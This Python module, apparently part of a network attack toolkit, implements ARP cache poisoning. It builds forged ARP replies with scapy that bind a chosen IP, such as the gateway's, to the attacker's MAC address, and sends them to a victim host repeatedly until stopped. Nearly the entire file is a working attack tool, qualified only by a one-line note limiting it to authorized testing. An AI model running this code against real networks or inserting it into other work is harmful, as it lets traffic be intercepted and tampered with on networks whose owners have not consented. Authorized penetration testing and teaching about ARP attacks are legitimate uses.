"""ARP spoofing: send forged ARP replies that bind an IP address to the attacker's MAC.

Hosts cache the IP-to-MAC mapping from ARP replies, and many accept replies they
did not request. A forged reply that says the gateway's IP is at the attacker's
MAC makes the victim send that traffic to the attacker.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import (
    BROADCAST_MAC,
    Runner,
    normalize_unicast_mac,
    read_interface_mac,
    run_command,
)

ZERO_MAC = "00:00:00:00:00:00"
ARP_REPLY = 2


def _ipv4(value: str, label: str) -> str:
    text = value.strip()
    if not text:
        raise ValueError(f"{label} is required.")
    try:
        return str(ipaddress.IPv4Address(text))
    except ValueError:
        raise ValueError(f"Invalid {label}: {value}") from None


@dataclass(frozen=True)
class ArpSpoofingConfig:
    iface: str                # attacker interface, on the victim's segment
    spoofed_ip: str           # IP address to impersonate, for example the gateway
    victim_ip: str            # host whose ARP cache is poisoned
    victim_mac: str = ""      # optional; empty = send the reply to broadcast
    count: int = 0            # replies to send; 0 = run until stopped
    interval: float = 1.0     # seconds between replies
    dry_run: bool = False     # build replies but do not send them

    def __post_init__(self) -> None:
        _ipv4(self.spoofed_ip, "spoofed IP")
        _ipv4(self.victim_ip, "victim IP")
        if self.victim_mac.strip():
            normalize_unicast_mac(self.victim_mac)


@dataclass
class ArpSpoofingStats:
    frames: int = 0
    sender_mac: str = ""


def build_arp_reply(
    sender_mac: str, spoofed_ip: str, victim_ip: str, victim_mac: str = ""
) -> Packet:
    """ARP reply that tells the victim `spoofed_ip` is at `sender_mac`."""
    if victim_mac:
        eth_dst, hw_dst = victim_mac, victim_mac
    else:
        eth_dst, hw_dst = BROADCAST_MAC, ZERO_MAC
    return Ether(src=sender_mac, dst=eth_dst) / ARP(
        op=ARP_REPLY,
        hwsrc=sender_mac,
        psrc=spoofed_ip,
        hwdst=hw_dst,
        pdst=victim_ip,
    )


def run_arp_spoofing(
    config: ArpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[ArpSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> ArpSpoofingStats:
    """Send forged ARP replies until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp
    sender_mac = read_interface_mac(config.iface, run)
    victim_mac = normalize_unicast_mac(config.victim_mac) if config.victim_mac.strip() else ""
    spoofed = _ipv4(config.spoofed_ip, "spoofed IP")
    victim = _ipv4(config.victim_ip, "victim IP")

    stats = ArpSpoofingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_arp_reply(sender_mac, spoofed, victim, victim_mac)
        if not config.dry_run:
            send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
